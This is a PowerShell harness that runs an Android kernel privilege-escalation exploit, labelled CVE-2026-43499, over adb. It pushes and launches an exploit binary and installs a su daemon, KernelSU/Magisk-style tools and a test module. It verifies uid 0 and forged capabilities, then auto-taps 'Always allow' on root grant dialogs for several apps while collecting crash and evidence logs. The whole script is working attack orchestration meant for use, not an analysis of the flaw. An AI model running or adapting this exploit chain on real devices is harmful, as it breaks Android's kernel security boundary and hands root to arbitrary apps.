param([int]$MaxAttempts = 5)

$ErrorActionPreference = 'Continue'
$root = Split-Path -Parent $MyInvocation.MyCommand.Path
$adb = Join-Path $root 'tools\adb.exe'
$ev = Join-Path $root 'evidence'
New-Item -ItemType Directory -Force -Path $ev | Out-Null

try { Start-Transcript -Path (Join-Path $ev 'run.log') -Force | Out-Null } catch {}

function Say($m) { Write-Host $m }
function Fail($m) {
    Write-Host ""
    Write-Host "FAIL: $m" -ForegroundColor Red
    try { Stop-Transcript | Out-Null } catch {}
    exit 1
}

function Dump-Ui {
    for ($i = 0; $i -lt 3; $i++) {
        & $adb shell uiautomator dump /sdcard/ui.xml 2>&1 | Out-Null
        $x = (& $adb shell cat /sdcard/ui.xml 2>$null | Out-String)
        if ($x -match '<hierarchy') { return $x }
        Start-Sleep -Milliseconds 400
    }
    return ''
}

function Tap-InXml([string]$xml, [string]$text) {
    $pat = 'text="' + [regex]::Escape($text) + '"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
    $m = [regex]::Match($xml, $pat)
    if (-not $m.Success) { return $false }
    $x = [int](([int]$m.Groups[1].Value + [int]$m.Groups[3].Value) / 2)
    $y = [int](([int]$m.Groups[2].Value + [int]$m.Groups[4].Value) / 2)
    & $adb shell "input tap $x $y" 2>&1 | Out-Null
    return $true
}

function Tap-Text([string]$text) {
    return (Tap-InXml (Dump-Ui) $text)
}

function Wait-Prompt-Strict([int]$seconds) {
    # Do not tap anything: the app's own onboarding can sit at the same
    # coordinates as the grant dialog, and a blind tap would answer it.
    $deadline = (Get-Date).AddSeconds($seconds)
    while ((Get-Date) -lt $deadline) {
        $xml = Dump-Ui
        if ($xml -match 'Root access request' -or $xml -match 'Always allow') { return $xml }
        Start-Sleep -Milliseconds 400
    }
    return ''
}

function Count-Prompts([int]$uid) {
    $r = (& $adb shell "grep -c 'SU prompt uid=$uid' /data/local/tmp/rootd.log 2>/dev/null || true" 2>$null | Out-String).Trim()
    if ($r -match '^(\d+)$') { return [int]$matches[1] }
    return 0
}

function Get-PendingPrompt {
    # A pending request is req_<id> with no ans_<id>: the grant dialog is up.
    $out = (& $adb shell "ls /data/local/tmp/a12su 2>/dev/null" 2>$null | Out-String)
    $req = @(); $ans = @()
    foreach ($n in ($out -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ })) {
        if ($n -match '^req_(\d+)$') { $req += [int]$matches[1] }
        elseif ($n -match '^ans_(\d+)$') { $ans += [int]$matches[1] }
    }
    return @($req | Where-Object { $ans -notcontains $_ }).Count
}

function Wait-Prompt([int]$seconds) {
    $deadline = (Get-Date).AddSeconds($seconds)
    while ((Get-Date) -lt $deadline) {
        $xml = Dump-Ui
        if ($xml -match 'Root access request') { return $xml }
        # Never tap while a grant dialog is pending: an onboarding tap computed
        # from an older dump can land on "Always allow" and grant root to a
        # request the user never saw.  Wait for the dialog to show up in a dump.
        if ((Get-PendingPrompt) -gt 0) { Start-Sleep -Milliseconds 300; continue }
        # Tap through known first-run dialogs that sit in front of the root probe
        # (App Manager KeyStore notice, Neo Backup / SD Maid intro screens).
        $tapped = $false
        foreach ($t in @("Let's go!", 'Lets go!', 'Close', 'Continue', 'Next', 'Skip', 'Got it')) {
            if (Tap-InXml $xml $t) { $tapped = $true; break }
        }
        if ($tapped) { Start-Sleep -Milliseconds 900; continue }
        Start-Sleep -Milliseconds 500
    }
    return ''
}

# Walk an app's first-run wizard to its main screen.  Both demo apps gate their
# root status behind onboarding (Neo Backup: "Let's go!" setup pages, App
# Manager: a backup-volume notice), so the "root missing" banner is invisible
# until the wizard is done.
function Advance-Ui([int]$steps = 10) {
    $xml = ''
    for ($i = 0; $i -lt $steps; $i++) {
        $xml = Dump-Ui
        if ($xml -eq '') { Start-Sleep -Milliseconds 800; continue }
        $tapped = $false
        foreach ($t in @("Let's go!", 'Lets go!', 'I Agree', 'Accept', 'Next', 'Continue',
                         'Skip', 'Got it', 'Close', 'Allow', 'OK', 'Done', 'Start')) {
            if (Tap-InXml $xml $t) { $tapped = $true; break }
        }
        if (-not $tapped) { break }
        Start-Sleep -Milliseconds 1200
    }
    return $xml
}

function Grant-Prompt([int]$uid) {
    # Tap "Always allow" until the daemon records allow=1.  The first tap on a
    # freshly shown dialog can land as "focus the window" instead of "press the
    # button", and the dialog auto-denies after 30 s, so verify and retry.
    # Only ever tap a dialog that names THIS uid: another app (e.g. Shizuku
    # auto-starting on boot) can own the one visible dialog, and granting the
    # wrong app root is exactly what a root manager must never do.
    for ($k = 0; $k -lt 6; $k++) {
        $dec = (& $adb shell "grep 'SU decision uid=$uid' /data/local/tmp/rootd.log | tail -1" 2>$null | Out-String)
        if ($dec -match 'allow=1') { return $true }
        $xml = Dump-Ui
        if ($xml -match 'Always allow') {
            if ($xml -match "uid $uid\b") {
                [void](Tap-InXml $xml 'Always allow')
            } else {
                Say "  (dialog on screen belongs to another uid; waiting)"
            }
        } elseif ($xml -match 'text="Allow"' -and $xml -match "uid $uid\b") {
            [void](Tap-InXml $xml 'Allow')
        } elseif ((Get-PendingPrompt) -eq 0) {
            # Nothing on screen and nothing pending: the app may not have asked
            # yet (or already got an answer).  Give it a moment.
            Start-Sleep -Seconds 2
            continue
        }
        Start-Sleep -Seconds 3
    }
    $dec = (& $adb shell "grep 'SU decision uid=$uid' /data/local/tmp/rootd.log | tail -1" 2>$null | Out-String)
    return ($dec -match 'allow=1')
}

function Test-RootApp([string]$pkg, [string]$activity, [string]$tag, [string]$badText) {
    Say ""
    Say "[app] $tag ($pkg)"
    $uidLine = (& $adb shell "cmd package list packages -U | grep $pkg" 2>&1 | Out-String)
    $uid = -1
    if ($uidLine -match 'uid:(\d+)') { $uid = [int]$matches[1] }
    Say "  uid=$uid"

    & $adb shell "am force-stop $pkg" 2>&1 | Out-Null
    & $adb shell "pm clear $pkg" 2>&1 | Out-Null
    Start-Sleep -Milliseconds 600
    $promptBefore = Count-Prompts $uid
    & $adb shell "am start -n $activity" 2>&1 | Out-Null
    Start-Sleep -Seconds 2

    $prompt = Wait-Prompt-Strict 30
    if ($prompt -eq '') { $prompt = Wait-Prompt 25 }
    # The dialog can be answered before the next dump sees it (a stray tap, or
    # a person watching the phone).  The daemon logs every prompt it shows, so
    # a new "SU prompt uid=N" line is proof the dialog was up.
    $promptAfter = Count-Prompts $uid
    $promptLogged = ($promptAfter -gt $promptBefore)
    $seen = ($prompt -ne '') -or $promptLogged
    if ($seen) {
        if ($prompt -ne '') {
            Say "  PROMPT VISIBLE"
            & $adb shell "screencap -p /sdcard/prompt_$tag.png" 2>&1 | Out-Null
            & $adb pull "/sdcard/prompt_$tag.png" (Join-Path $ev "prompt_$tag.png") 2>&1 | Out-Null
        } else {
            Say "  PROMPT SHOWN (daemon log; answered before the next UI dump)"
            & $adb shell "grep 'SU prompt uid=$uid' /data/local/tmp/rootd.log | tail -1" 2>&1 |
                Out-File -FilePath (Join-Path $ev "prompt_$tag.log") -Encoding ASCII
        }
        $granted = Grant-Prompt $uid
        Say "  tapped grant: $granted"
        Start-Sleep -Seconds 3
    } else {
        Say "  NO PROMPT SEEN"
    }

    # Finish onboarding so the app reaches the screen that reports root status.
    Advance-Ui | Out-Null
    Start-Sleep -Seconds 2
    $ui = Dump-Ui
    Set-Content -Path (Join-Path $ev "${tag}_ui.xml") -Value $ui
    & $adb shell "screencap -p /sdcard/after_$tag.png" 2>&1 | Out-Null
    & $adb pull "/sdcard/after_$tag.png" (Join-Path $ev "after_$tag.png") 2>&1 | Out-Null

    $bad = $false
    if ($badText -ne '') { $bad = ($ui -match [regex]::Escape($badText)) }
    $decision = (& $adb shell "grep 'SU decision uid=$uid' /data/local/tmp/rootd.log | tail -3" 2>&1 | Out-String)
    $done = (& $adb shell "grep 'SU done uid=$uid' /data/local/tmp/rootd.log | tail -3" 2>&1 | Out-String)
    $cmds = (& $adb shell "grep 'SU shellcmd uid=$uid' /data/local/tmp/rootd.log | tail -4" 2>&1 | Out-String)
    # A persistent shell stays open for the app's lifetime, so "SU done" never
    # appears for these apps.  Proof that root works is: the request was
    # allowed, the app actually pushed commands into its root shell, and its
    # UI stopped complaining about missing root.
    $rooted = ($decision -match 'allow=1') -and ($cmds -match 'SU shellcmd') -and (-not $bad)
    Say ("  decision: " + $decision.Trim())
    Say ("  shell cmds: " + (($cmds -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ }) -join ' ; '))
    Say ("  done (only on shell close): " + $done.Trim())
    Say "  still shows '$badText': $bad"
    Say "  app ran root commands successfully: $rooted"
    return @{ Seen = $seen; Bad = $bad; Uid = $uid; Decision = $decision; Done = $done; Cmds = $cmds; Rooted = $rooted }
}

Say "=== A12 one-shot root (CVE-2026-43499) ==="
Say "Payload: kernel uid 0 + forged caps + su daemon + grant dialog + root apps"

& $adb start-server | Out-Null
$devs = (& $adb devices 2>&1 | Out-String)
if ($devs -notmatch "\sdevice\s*$") {
    Fail "no adb device. Enable USB debugging and accept the RSA prompt."
}
Say ("Device: " + ((& $adb shell getprop ro.product.model 2>&1 | Out-String).Trim()) +
     " / " + ((& $adb shell getprop ro.build.version.release 2>&1 | Out-String).Trim()))

# Shizuku keeps "start on boot" after its first run, and a boot-time request
# would steal the grant dialog from the app under test.  Remove it now; it is
# reinstalled fresh in the app phase, so its first root request is the one the
# harness drives.
& $adb uninstall moe.shizuku.privileged.api 2>&1 | Out-Null

$ok = $false
$reuseBoot = $false
for ($attempt = 1; $attempt -le $MaxAttempts -and -not $ok; $attempt++) {
    Say ""
    Say "[attempt $attempt/$MaxAttempts] fresh boot (one exploit run per boot)"
    try {
        if ($reuseBoot) {
            # The previous attempt panicked and the box auto-rebooted.  That
            # boot has never run the exploit, so use it instead of rebooting
            # again (saves a minute and is equally fresh).
            $reuseBoot = $false
            Say "  reusing the auto-rebooted boot (no exploit run on it yet)"
        } else {
            & $adb wait-for-device | Out-Null
            & $adb reboot | Out-Null
            & $adb wait-for-device | Out-Null

            $deadline = (Get-Date).AddSeconds(180)
            $bc = ''
            while ($true) {
                Start-Sleep -Seconds 2
                $bc = (& $adb shell getprop sys.boot_completed 2>$null | Out-String).Trim()
                if ($bc -eq '1') { break }
                if ((Get-Date) -gt $deadline) { break }
            }
            if ($bc -ne '1') { Say "  boot_completed timeout"; continue }
            Start-Sleep -Seconds 5
        }

        $bootid = (& $adb shell cat /proc/sys/kernel/random/boot_id 2>$null | Out-String).Trim()
        Say "  boot_id: $bootid"

        Say "  pushing payload"
        & $adb push (Join-Path $root 'payload\exploit') /data/local/tmp/a12exploit 2>&1 | Out-Null
        & $adb push (Join-Path $root 'payload\su') /data/local/tmp/su 2>&1 | Out-Null
        & $adb shell "mkdir -p /data/local/tmp/a12stage" 2>&1 | Out-Null
        foreach ($f in @('ksud', 'magisk', 'resetprop', 'a12mod.sh')) {
            & $adb push (Join-Path $root "payload\$f") "/data/local/tmp/a12stage/$f" 2>&1 | Out-Null
        }
        & $adb push (Join-Path $root 'payload\a12mod_test.zip') /data/local/tmp/a12mod_test.zip 2>&1 | Out-Null
        & $adb shell "chmod 755 /data/local/tmp/a12exploit /data/local/tmp/su /data/local/tmp/a12stage/*" 2>&1 | Out-Null

        # /data/local/tmp survives reboots, so an old grant would suppress the
        # popup.  Wipe the policy so every run shows a fresh prompt per app.
        & $adb shell "rm -rf /data/local/tmp/a12su" 2>&1 | Out-Null

        Say "  running exploit (rootd)"
        & $adb shell "rm -f /data/local/tmp/rootd.log /data/local/tmp/rootproof.txt /data/local/tmp/id_caps.out /data/local/tmp/su_selftest.out; LOG=/data/local/tmp/rootd.log SLOT0=0 setsid /data/local/tmp/a12exploit rootd </dev/null >/dev/null 2>&1 &" 2>&1 | Out-Null

        # A miss is expensive (a whole reboot), so give a slow-but-successful
        # run 150s before declaring failure.  A kernel panic reboots the box
        # immediately, so poll boot_id and stop waiting as soon as it changes.
        $deadline = (Get-Date).AddSeconds(150)
        $nextBootCheck = (Get-Date).AddSeconds(10)
        $rebooted = $false
        $log = ''
        while ($true) {
            Start-Sleep -Seconds 2
            $log = (& $adb shell cat /data/local/tmp/rootd.log 2>$null | Out-String)
            if ($log -match 'ROOTD READY') { break }
            if ((Get-Date) -gt $deadline) { break }
            if ((Get-Date) -gt $nextBootCheck) {
                $now = (& $adb shell cat /proc/sys/kernel/random/boot_id 2>$null | Out-String).Trim()
                if ($now -ne '' -and $now -ne $bootid) { $rebooted = $true; break }
                $nextBootCheck = (Get-Date).AddSeconds(10)
            }
        }
        if ($log -notmatch 'ROOTD READY') {
            Say ("  exploit did not reach ROOTD READY " +
                 $(if ($rebooted) { '(box rebooted)' } else { '(150s)' }))
            # Capture the miss before the next attempt reboots and wipes tmpfs.
            $nowBoot = (& $adb shell cat /proc/sys/kernel/random/boot_id 2>$null | Out-String).Trim()
            Say ("  box alive: " + ($nowBoot -eq $bootid) + " (boot_id " + $nowBoot + ")")
            Set-Content -Path (Join-Path $ev ("miss_" + $bootid + "_rootd.log")) -Value $log
            $dm = (& $adb shell "dmesg 2>/dev/null" 2>$null | Out-String)
            Set-Content -Path (Join-Path $ev ("miss_" + $bootid + "_dmesg.log")) -Value $dm
            $panic = @($dm -split "`n" | Where-Object {
                $_ -match 'Kernel panic|Unable to handle|Internal error|BUG:|Oops|Call trace|watchdog'
            })
            Say ("  crash markers: " + $panic.Count)
            if ($panic.Count -gt 0) { Say (($panic | Select-Object -First 8) -join "`n") }
            $tail = @($log -split "`n" | Where-Object { $_.Trim() -ne '' } | Select-Object -Last 12)
            if ($tail.Count -gt 0) {
                Say "  last rootd lines:"
                Say ($tail -join "`n")
            } else {
                Say "  rootd.log empty or missing"
            }
            $still = (& $adb shell "pidof a12exploit" 2>$null | Out-String).Trim()
            Say ("  exploit pid: " + $(if ($still) { $still } else { 'gone' }))
            if ($nowBoot -ne $bootid) {
                # The box panicked and auto-rebooted.  console-ramoops (mode
                # 0640 system:log, and shell is in group log) still holds the
                # crashed boot's console until the next reboot, so grab it now.
                Say "  box rebooted during the run - pulling panic console"
                $wd = (Get-Date).AddSeconds(120)
                $online = $false
                while ((Get-Date) -lt $wd) {
                    if (((& $adb get-state 2>&1 | Out-String)) -match 'device') { $online = $true; break }
                    Start-Sleep -Seconds 2
                }
                if (-not $online) {
                    Say "  device did not come back after the reboot"
                    Fail "device lost after a kernel panic; check the phone"
                }
                $bd = (Get-Date).AddSeconds(150)
                while ((Get-Date) -lt $bd) {
                    Start-Sleep -Seconds 2
                    if (((& $adb shell getprop sys.boot_completed 2>$null | Out-String).Trim()) -eq '1') { break }
                }
                Start-Sleep -Seconds 3
                $ps = (& $adb shell "cat /sys/fs/pstore/console-ramoops-0 2>/dev/null" 2>$null | Out-String)
                if ($ps.Trim() -eq '') {
                    $ps = (& $adb shell "cat /proc/last_kmsg 2>/dev/null" 2>$null | Out-String)
                }
                Set-Content -Path (Join-Path $ev ("miss_" + $bootid + "_pstore.log")) -Value $ps
                $pm = @($ps -split "`n" | Where-Object {
                    $_ -match 'Kernel panic|Unable to handle|Internal error|BUG:|Oops|Call trace|PC is at|LR is at|Fatal exception|watchdog'
                })
                Say ("  panic lines: " + $pm.Count)
                if ($pm.Count -gt 0) { Say (($pm | Select-Object -First 16) -join "`n") }
                $reuseBoot = $true
            }
            continue
        }

        $proof = (& $adb shell cat /data/local/tmp/rootproof.txt 2>$null | Out-String)
        $idc = (& $adb shell cat /data/local/tmp/id_caps.out 2>$null | Out-String)
        $suout = (& $adb shell "/system_ext/bin/su -c id" 2>$null | Out-String)
        $selftest = (& $adb shell cat /data/local/tmp/su_selftest.out 2>$null | Out-String)

        # The daemon forks `ksud late-load` right after ROOTD READY.
        $ll = ''
        $dl = (Get-Date).AddSeconds(30)
        while ((Get-Date) -lt $dl) {
            Start-Sleep -Seconds 1
            $ll = (& $adb shell "cat /data/adb/ksu/log/late-load.log 2>/dev/null" 2>$null | Out-String)
            if ($ll -match 'late-load done') { break }
        }

        Say "  --- KernelSU compatibility ---"
        $ksuver = (& $adb shell "/system_ext/bin/su -c 'su -v; su -V; ksud --version; magisk -v; magisk -V'" 2>$null | Out-String)
        Say $ksuver.Trim()
        $targetId = (& $adb shell "/system_ext/bin/su 2000 -c 'id -u'" 2>$null | Out-String)
        Say ("  su 2000 -c id -u -> " + $targetId.Trim())
        $prop = (& $adb shell "/system_ext/bin/su -c 'resetprop debug.a12oneclick hello; getprop debug.a12oneclick'" 2>$null | Out-String)
        Say ("  resetprop round-trip -> " + $prop.Trim())

        Say "  --- module install (hot) ---"
        $modout = (& $adb shell "/system_ext/bin/su -c 'ksud module install /data/local/tmp/a12mod_test.zip'" 2>$null | Out-String)
        Say $modout.Trim()
        $modlist = (& $adb shell "/system_ext/bin/su -c 'ksud module list'" 2>$null | Out-String)
        Say $modlist.Trim()
        $overlay = (& $adb shell "cat /system/etc/a12mod_test.txt" 2>$null | Out-String)
        Say ("  overlay file -> " + $overlay.Trim())
        Start-Sleep -Seconds 2
        $svc = (& $adb shell "cat /data/local/tmp/a12mod_service.txt" 2>$null | Out-String)
        Say ("  service.sh -> " + (($svc -split "`n" | Select-Object -First 2) -join ' | '))

        Say ""
        Say "  --- kernel proof (rootproof.txt) ---"
        Say $proof.Trim()
        Say "  --- id_caps.out ---"
        Say $idc.Trim()
        Say "  --- /system_ext/bin/su -c id (from adb shell) ---"
        Say $suout.Trim()
        Say "  --- su daemon selftest (uid 2000) ---"
        Say $selftest.Trim()
        Say "  --- interactive shell selftest ---"
        Say (($log -split "`n" | Select-String -Pattern 'SU shell test' | ForEach-Object { $_.Line }) -join "`n")

        if (($idc -match 'uid=0') -and ($suout -match 'uid=0') -and ($log -match 'SU shell test OK')) { $ok = $true }
        else { Say "  verification strings missing" }
    }
    catch {
        Say ("  attempt error: " + $_.Exception.Message)
    }
}

if (-not $ok) { Fail "no root after $MaxAttempts attempts (device may have rebooted; run again)" }

Say ""
Say "[apps] installing manager + root apps"
foreach ($p in @('payload\SuApp.apk', 'payload\apps\NeoBackup.apk', 'payload\apps\AppManager.apk', 'payload\apps\Shizuku.apk')) {
    $path = Join-Path $root $p
    if (Test-Path $path) {
        $r = (& $adb install -r -g $path 2>&1 | Out-String)
        Say ("  " + $p + " -> " + (($r -split "`n") | Select-Object -Last 2 | ForEach-Object { $_.Trim() }) -join ' ')
    } else {
        Say ("  MISSING " + $p)
    }
}

$neo = Test-RootApp 'com.machiav3lli.backup' 'com.machiav3lli.backup/.ui.activities.NeoActivity' 'neobackup' 'ROOT missing'
$am = Test-RootApp 'io.github.muntashirakon.AppManager' 'io.github.muntashirakon.AppManager/.main.SplashActivity' 'appmanager' 'Root access is not available'

Say ""
Say "[app] Shizuku (moe.shizuku.privileged.api)"
$szUid = -1
$uidLine = (& $adb shell "cmd package list packages -U | grep moe.shizuku.privileged.api" 2>&1 | Out-String)
if ($uidLine -match 'uid:(\d+)') { $szUid = [int]$matches[1] }
Say "  uid=$szUid"

& $adb shell "am force-stop moe.shizuku.privileged.api" 2>&1 | Out-Null
& $adb shell "pm clear moe.shizuku.privileged.api" 2>&1 | Out-Null
Start-Sleep -Milliseconds 600
$szPromptBefore = Count-Prompts $szUid
& $adb shell "am start -n moe.shizuku.privileged.api/moe.shizuku.manager.MainActivity" 2>&1 | Out-Null
Start-Sleep -Seconds 3

# "Start (for rooted devices)" is the first "Start" button on the main screen.
$szUi = Dump-Ui
$szStarted = Tap-InXml $szUi 'Start'
Say "  tapped Start (rooted): $szStarted"

$szPrompt = Wait-Prompt-Strict 30
if ($szPrompt -eq '') { $szPrompt = Wait-Prompt 20 }
$szSeen = ($szPrompt -ne '') -or ((Count-Prompts $szUid) -gt $szPromptBefore)
if ($szSeen) {
    Say "  PROMPT VISIBLE"
    if ($szPrompt -ne '') {
        & $adb shell "screencap -p /sdcard/prompt_shizuku.png" 2>&1 | Out-Null
        & $adb pull "/sdcard/prompt_shizuku.png" (Join-Path $ev "prompt_shizuku.png") 2>&1 | Out-Null
    }
} else {
    Say "  NO PROMPT SEEN"
}
$szGranted = Grant-Prompt $szUid
Say "  tapped grant: $szGranted"

$szPid = ''
for ($i = 0; $i -lt 20; $i++) {
    Start-Sleep -Seconds 2
    $szPid = (& $adb shell "pidof shizuku_server 2>/dev/null" 2>$null | Out-String).Trim()
    if ($szPid -ne '') { break }
}
if ($szPid -eq '') {
    $ps = (& $adb shell "ps -A -o PID,NAME 2>/dev/null" 2>$null | Out-String)
    foreach ($line in ($ps -split "`n")) {
        if ($line -match 'shizuku_server' -and $line -match '^\s*(\d+)') { $szPid = $matches[1]; break }
    }
}
Say "  shizuku_server pid: $(if ($szPid) { $szPid } else { 'none' })"

# The starter screen sits at "Waiting for service"; restart the manager so it
# reports the state it now sees (force-stop does not kill the server).
& $adb shell "am force-stop moe.shizuku.privileged.api" 2>&1 | Out-Null
Start-Sleep -Seconds 1
& $adb shell "am start -n moe.shizuku.privileged.api/moe.shizuku.manager.MainActivity" 2>&1 | Out-Null
Start-Sleep -Seconds 6
$szUi = Dump-Ui
Set-Content -Path (Join-Path $ev 'shizuku_ui.xml') -Value $szUi
& $adb shell "screencap -p /sdcard/after_shizuku.png" 2>&1 | Out-Null
& $adb pull "/sdcard/after_shizuku.png" (Join-Path $ev "after_shizuku.png") 2>&1 | Out-Null

$szRunning = ($szUi -match 'Shizuku is running')
$szRootMode = ($szUi -match 'Version [0-9.]+, root')
$szPid2 = (& $adb shell "pidof shizuku_server 2>/dev/null" 2>$null | Out-String).Trim()
$szCred = ''
if ($szPid2 -ne '') {
    $szCred = (& $adb shell "/system_ext/bin/su -c 'grep ^Uid /proc/$szPid2/status'" 2>$null | Out-String).Trim()
}
Say "  running: $szRunning  root mode: $szRootMode"
Say "  server cred: $szCred"
$szOk = $szRunning -and $szRootMode -and $szGranted -and ($szPid2 -ne '') -and ($szCred -match '^Uid:\s+0\s')
Say "  Shizuku rooted and running: $szOk"

Say ""
Say "[app] A12 su manager"
& $adb shell "am force-stop com.a12root.suapp; am start -n com.a12root.suapp/.MainActivity" 2>&1 | Out-Null
Start-Sleep -Seconds 7
$suappUi = Dump-Ui
Set-Content -Path (Join-Path $ev 'suapp_ui.xml') -Value $suappUi
& $adb shell screencap -p /sdcard/a12_suapp.png 2>&1 | Out-Null
& $adb pull /sdcard/a12_suapp.png (Join-Path $ev 'suapp.png') 2>&1 | Out-Null
$suappOk = ($suappUi -match 'uid=0')
Say "  manager shows uid=0: $suappOk"

$suappPid = (& $adb shell "pidof com.a12root.suapp" 2>$null | Out-String).Trim()
$appMod = ''
if ($suappPid -ne '') {
    $appMod = (& $adb shell "/system_ext/bin/su -c 'cat /proc/$suappPid/root/system/etc/a12mod_test.txt'" 2>$null | Out-String)
}
Say ("  app process sees module overlay: " + $appMod.Trim())

$policy = (& $adb shell "cat /data/local/tmp/a12su/policy" 2>&1 | Out-String)
Say ""
Say "--- grant policy ---"
Say $policy.Trim()

$ksuOk = ($ksuver -match 'v3\.3\.1:KernelSU') -and ($ksuver -match '33001') -and
         ($ksuver -match 'uapi: 2') -and ($ksuver -match '25\.2:MAGISK')
$modOk = ($modlist -match 'a12mod_test') -and ($overlay -match 'hello from a12 module overlay') -and
         ($svc -match 'service ran')
$targetOk = ($targetId.Trim() -eq '2000')
$propOk = ($prop.Trim() -eq 'hello')
$appModOk = ($appMod -match 'hello from a12 module overlay')

& $adb pull /data/local/tmp/rootd.log (Join-Path $ev 'rootd.log') 2>&1 | Out-Null
& $adb pull /data/local/tmp/id_caps.out (Join-Path $ev 'id_caps.out') 2>&1 | Out-Null
& $adb pull /data/local/tmp/su_selftest.out (Join-Path $ev 'su_selftest.out') 2>&1 | Out-Null
& $adb shell "/system_ext/bin/su -c 'cp -f /data/adb/ksu/log/late-load.log /data/local/tmp/late-load.log; cp -f /data/adb/ksu/log/a12mod.log /data/local/tmp/a12mod.log; chmod 644 /data/local/tmp/late-load.log /data/local/tmp/a12mod.log'" 2>&1 | Out-Null
& $adb pull /data/local/tmp/late-load.log (Join-Path $ev 'late-load.log') 2>&1 | Out-Null
& $adb pull /data/local/tmp/a12mod.log (Join-Path $ev 'a12mod.log') 2>&1 | Out-Null
Set-Content -Path (Join-Path $ev 'policy.txt') -Value $policy
Set-Content -Path (Join-Path $ev 'ksu-version.txt') -Value $ksuver
Set-Content -Path (Join-Path $ev 'modules.txt') -Value $modlist

$pass = $ok -and $suappOk -and $neo.Seen -and $neo.Rooted -and (-not $neo.Bad) -and $am.Seen -and $am.Rooted -and (-not $am.Bad) -and
        $szOk -and
        $ksuOk -and $modOk -and $targetOk -and $propOk -and $appModOk
Say ""
Say ("KernelSU compatibility: version=$ksuOk modules=$modOk target-uid=$targetOk resetprop=$propOk app-overlay=$appModOk")
if ($pass) {
    Say "PASS: kernel root, su on PATH, grant dialog shown, Neo Backup / App Manager / Shizuku granted root," -ForegroundColor Green
    Say "      KernelSU-compatible CLI (ksud/magisk/su) and hot module install verified" -ForegroundColor Green
} else {
    Say "PARTIAL: root verified; see per-app and compatibility status above and evidence folder" -ForegroundColor Yellow
}
Say "Evidence: $ev"
try { Stop-Transcript | Out-Null } catch {}
exit 0
